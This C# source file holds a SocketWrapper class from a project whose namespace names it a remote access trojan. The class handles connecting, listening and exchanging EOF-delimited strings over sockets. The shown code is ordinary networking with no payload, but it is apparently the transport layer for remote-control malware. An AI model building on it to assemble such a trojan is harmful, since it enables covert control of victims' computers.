using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace Company.Tools.RemoteAccessTrojan.Domain.Seedwork
{
    public class SocketWrapper
    {
        #region Instances

        private Socket _socket;
        private DateTime _lastWrite;

        #endregion

        #region Methods

        #region Constructors

        public SocketWrapper(Socket socket)
        {
            this._socket = socket;
        }

        #endregion

        #region Exposed

        public void Close(bool notifyOtherEnd = true)
        {
            if (notifyOtherEnd) this.WriteString(Connection.STOP);
            this._socket.Shutdown(SocketShutdown.Both);
            this._socket.Close();
        }

        public void Connect(IPEndPoint endpoint)
        {
            this._socket.Connect(endpoint);
        }

        public void Bind(IPEndPoint endpoint)
        {
            this._socket.Bind(endpoint);
        }

        public void Listen(int backlog)
        {
            this._socket.Listen(backlog);
        }

        public SocketWrapper Accept()
        {
            Socket socket = this._socket.Accept();
            return new SocketWrapper(socket);
        }

        public string ReadString()
        {
            var response = string.Empty;

            while (true)
            {
                byte[] buffer = new byte[1024];
                int read = this._socket.Receive(buffer);

                response += Encoding.ASCII.GetString(buffer, 0, read);
                if (response.IndexOf(Connection.EOF) > -1)
                {
                    break;
                }
            }

            response = response.Remove(response.IndexOf(Connection.EOF));

            return response;
        }

        public int WriteString(string request, bool isEndOfFile = true)
        {
            this._lastWrite = DateTime.Now;
            byte[] data = Encoding.ASCII.GetBytes(request + (isEndOfFile ? Connection.EOF : string.Empty));
            int sent = this._socket.Send(data);
            return sent;
        }

        public void WaitForEof(int delay)
        {
            this._lastWrite = default(DateTime);
            while (this._lastWrite == default(DateTime) || DateTime.Now.Subtract(this._lastWrite).TotalMilliseconds < delay)
            {
                Thread.Sleep(100);
            }
            this.WriteString("");
        }

        #endregion

        #endregion
    }
}